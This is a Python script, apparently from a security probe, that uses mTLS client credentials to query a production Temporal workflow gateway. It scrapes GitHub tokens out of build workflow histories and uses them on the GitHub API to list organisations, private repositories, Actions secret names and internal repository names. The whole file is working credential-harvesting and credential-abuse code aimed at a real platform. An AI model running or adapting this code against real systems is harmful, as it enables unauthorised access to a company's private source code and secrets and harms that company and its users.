#!/usr/bin/env python3
# I67852 round3: definitive boundary checks for the platform-side railway-railpack GitHub
# identities + verify whether githubToken is per-tenant. Read-only GETs only. Compact output.
import subprocess, struct, json, sys, os, time, re, hashlib

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
T = '/temporal.api.workflowservice.v1.WorkflowService/'
CTR = [0]

# sha256[:10] of the two platform-side token values extracted in rounds 1/2
# (raw values deliberately NOT embedded: this repo is public)
KNOWN_SHA = {
    'githubToken': '1d18596651',
    'railpack.githubBotToken': 'b95b3177bf',
}
PROBE_REPOS = ['railway', 'railway-app', 'backboard', 'orchestrator', 'station', 'railyard', 'siteops',
               'cms', 'hikari', 'network-cp', 'stacklet', 'builderv3', 'private-api', 'api', 'web',
               'dashboard', 'cli', 'nixpacks', 'railpack', 'templates', 'metal', 'registry', 'terraform',
               'infra', 'railway-infra', 'rw-checks', 'zfs', 'vol-unpacker', 'rust-buildkit',
               'station-prometheus', 'railway-builder', 'extensions', 'docs', 'blog', 'og']
OUT = []


def say(s):
    OUT.append(s)


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
        if s > 63:
            break
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l]))
            i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4]))
            i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8]))
            i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def grpc_call(path, body=b'', timeout=25):
    CTR[0] += 1
    n = CTR[0]
    fu = '/tmp/r%d.bin' % n
    hu = '/tmp/h%d.txt' % n
    bu = '/tmp/b%d.bin' % n
    framed = b'\x00' + struct.pack('>I', len(body)) + body
    open(fu, 'wb').write(framed)
    subprocess.run(['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu,
                    '-o', bu, '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
                    '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu],
                   capture_output=True, text=True)
    try:
        hdr = open(hu, 'rb').read().decode('utf-8', 'replace')
    except Exception:
        hdr = ''
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    return {'st': (sts[-1] if sts else '-'), 'data': data}


def frame_payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None
    return None


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


json_re = re.compile(rb'\{"', re.S)


def jsons_from(b):
    out = []
    i = 0
    while True:
        m = json_re.search(b, i)
        if not m:
            break
        s = m.start()
        depth = 0
        j = s
        inq = False
        esc = False
        while j < len(b):
            c = b[j:j + 1]
            if inq:
                if esc:
                    esc = False
                elif c == b'\\':
                    esc = True
                elif c == b'"':
                    inq = False
            else:
                if c == b'"':
                    inq = True
                elif c == b'{':
                    depth += 1
                elif c == b'}':
                    depth -= 1
                    if depth == 0:
                        break
            j += 1
        if j < len(b) and 2 < j - s < 400000:
            try:
                out.append(json.loads(b[s:j + 1].decode('utf-8', 'replace')))
            except Exception:
                pass
        i = max(j, s + 2)
        if len(out) > 60:
            break
    return out


TOKEN_KEYS = ('githubtoken', 'bearertoken', 'githubbottoken')


def walk(o, prefix='', found=None):
    found = found if found is not None else []
    if isinstance(o, dict):
        for k, v in o.items():
            lk = k.lower()
            if isinstance(v, str) and any(lk == tk or lk.endswith('.' + tk) for tk in TOKEN_KEYS):
                found.append((prefix + k, v))
            walk(v, prefix + k + '.', found)
    elif isinstance(o, list):
        for it in o[:6]:
            walk(it, prefix, found)
    return found


def gh(path, tok):
    p = subprocess.run(['curl', '-sS', '-m', '25', '-w', '\n%{http_code}', '-D', '/tmp/gh.h',
                        '-H', 'Authorization: token ' + tok, '-H', 'User-Agent: i67852-probe',
                        '-H', 'Accept: application/vnd.github+json', 'https://api.github.com' + path],
                       capture_output=True, text=True)
    body = p.stdout or ''
    code = ''
    if '\n' in body:
        body, code = body.rsplit('\n', 1)
    try:
        hdr = open('/tmp/gh.h', 'r', errors='replace').read()
    except Exception:
        hdr = ''
    return code.strip(), body, hdr


def names(body, field='full_name', limit=100):
    try:
        d = json.loads(body)
    except Exception:
        return []
    arr = d if isinstance(d, list) else (d.get('repositories') or d.get('items') or [])
    return [x.get(field) for x in arr[:limit] if isinstance(x, dict)]


def scopes(hdr):
    m = re.findall(r'(?im)^x-oauth-scopes:\s*([^\r\n]*)', hdr)
    a = re.findall(r'(?im)^x-accepted-oauth-scopes:\s*([^\r\n]*)', hdr)
    return (m[-1].strip() if m else '<none>'), (a[-1].strip() if a else '')


def deep(label, tok):
    code, body, hdr = gh('/user', tok)
    try:
        d = json.loads(body)
        ident = '%s/%s/id%s' % (d.get('login'), d.get('type'), d.get('id'))
    except Exception:
        ident = body[:80].replace('\n', ' ')
    sc, acc = scopes(hdr)
    say('DEEP|%s|user=%s|http=%s|scopes=[%s]|accepted=[%s]' % (label, ident, code, sc, acc))
    code, body, hdr = gh('/user/orgs?per_page=100', tok)
    orgs = names(body, 'login')
    say('DEEP|%s|user_orgs|http=%s|%s' % (label, code, ','.join(orgs[:20])))
    code, body, hdr = gh('/user/repos?per_page=100&visibility=all', tok)
    rp = names(body)
    say('DEEP|%s|user_repos|http=%s|n=%d|%s' % (label, code, len(rp), ','.join(rp[:15])))
    code, body, hdr = gh('/orgs/railwayapp/repos?per_page=100&type=private', tok)
    priv = names(body)
    say('DEEP|%s|railwayapp_private|http=%s|n=%d|%s' % (label, code, len(priv), ','.join(priv[:20])))
    code2, body2, _ = gh('/orgs/railwayapp/repos?per_page=100&type=all&page=2', tok)
    say('DEEP|%s|railwayapp_all_p2|http=%s|n=%d' % (label, code2, len(names(body2))))
    code, body, hdr = gh('/orgs/railwayapp/actions/secrets?per_page=50', tok)
    try:
        sec = [s.get('name') for s in (json.loads(body).get('secrets') or [])]
    except Exception:
        sec = []
    say('DEEP|%s|org_secret_names|http=%s|%s' % (label, code, ','.join(sec)))
    for repo in ['railpack', 'templates']:
        code, body, hdr = gh('/repos/railwayapp/%s/actions/secrets?per_page=50' % repo, tok)
        try:
            sec = [s.get('name') for s in (json.loads(body).get('secrets') or [])]
        except Exception:
            sec = []
        say('DEEP|%s|secret_names[%s]|http=%s|%s' % (label, repo, code, ','.join(sec)))
    hits = []
    for r in PROBE_REPOS:
        code, body, hdr = gh('/repos/railwayapp/' + r, tok)
        if code == '200':
            try:
                d = json.loads(body)
                hits.append('%s:%s' % (r, 'priv' if d.get('private') else 'pub'))
            except Exception:
                hits.append(r + ':200')
        elif code not in ('404',):
            hits.append('%s:http%s' % (r, code))
    say('DEEP|%s|repo_existence|200=%s|non404=%s' % (label,
        ','.join(hits[:40]), ','.join([h for h in hits if ':http' in h])[:200]))


def sample_histories():
    execs = []
    for q in ['WorkflowType="ScheduleBuildAndPublishImage"', 'WorkflowType="ScheduleSnapshotAndBuild"']:
        r = grpc_call(T + 'ListWorkflowExecutions', fs(1, 'builds') + fv(2, 20) + fs(4, q))
        if r['st'] != '0':
            continue
        pl = frame_payload(r['data'])
        for ei in all_of(pl, 1):
            ex = get1(ei, 1) or b''
            wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
            rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
            ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
            if wid:
                execs.append((wid, rid, ty))
    seen = set()
    uniq = []
    for e in execs:
        if e[1] not in seen:
            seen.add(e[1])
            uniq.append(e)
    picks = [e for e in uniq if 'BuildAndPublish' in e[2]][:3] + [e for e in uniq if 'SnapshotAndBuild' in e[2]][:2]
    found = []
    for wid, rid, ty in picks:
        tk = b''
        for pg in range(2):
            r = grpc_call(T + 'GetWorkflowExecutionHistory',
                          fs(1, 'builds') + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20) + (fmsg(4, tk) if tk else b''),
                          timeout=30)
            if r['st'] != '0':
                break
            pl = frame_payload(r['data'])
            tk = get1(pl, 3) or b''
            for j in jsons_from(pl):
                for k, v in walk(j):
                    found.append((ty, k, v.strip()))
            if not tk:
                break
    return found


def main():
    found = sample_histories()
    variants = {}
    for ty, k, v in found:
        if not v or len(v) < 8:
            continue
        h = hashlib.sha256(v.encode()).hexdigest()[:10]
        variants.setdefault((k, h), v)
    say('SAMPLE|histories=5|token_fields=%d|unique=%d' % (len(found), len(variants)))
    for (k, h), v in variants.items():
        known = any(h == x for x in KNOWN_SHA.values())
        say('SAMPLE|key=%s|sha=%s|len=%d|known_platform=%s' % (k, h, len(v), known))

    # 1) identity/scope/boundary of the two platform tokens when re-extracted from history
    did = 0
    for (k, h), v in variants.items():
        if KNOWN_SHA.get(k) == h:
            deep('platform_' + k.replace('.', '_'), v)
            did += 1
            time.sleep(1)
    say('KNOWN_FOUND=%d/2' % did)
    # 2) any NEW token value -> identity only
    for (k, h), v in variants.items():
        if any(h == x for x in KNOWN_SHA.values()):
            continue
        code, body, hdr = gh('/user', v)
        try:
            d = json.loads(body)
            ident = '%s/%s' % (d.get('login'), d.get('type'))
        except Exception:
            ident = body[:60].replace('\n', ' ')
        say('NEWTOK|key=%s|sha=%s|user_http=%s|ident=%s' % (k, h, code, ident))
        code2, body2, _ = gh('/installation/repositories?per_page=30', v)
        say('NEWTOK|key=%s|inst_repos_http=%s|owners=%s' % (k, code2, ','.join(sorted(set(x.split('/')[0] for x in names(body2))))))
        time.sleep(1)

    say('===I67852R3 SUMMARY===')
    for s in OUT:
        if not s.startswith('===I67852R3'):
            print(s, flush=True)
    print('===I67852R3 END===', flush=True)


if __name__ == '__main__':
    main()
